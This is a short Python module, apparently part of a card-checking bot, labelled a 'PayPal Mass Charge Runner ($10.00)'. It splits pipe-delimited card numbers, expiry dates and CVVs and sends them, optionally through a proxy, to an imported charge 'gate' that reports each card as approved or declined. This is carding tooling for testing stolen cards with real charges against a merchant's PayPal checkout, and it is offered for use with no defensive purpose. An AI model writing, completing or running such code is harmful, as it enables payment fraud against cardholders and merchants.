"""
PayPal Mass Charge Runner ($10.00) - /mpp2
"""
from gates.charge.pp2_lounsbury import check_card_paypal_lounsbury

async def run_mpp2(card: str, proxy: str | None = None) -> tuple[str, str, str]:
    parts = card.split("|")
    if len(parts) >= 4:
        st, msg, brand = await check_card_paypal_lounsbury(parts[0], parts[1], parts[2], parts[3], proxy_url=proxy)
        return st, msg, brand
    return "declined", "Invalid Card Format", "Unknown"
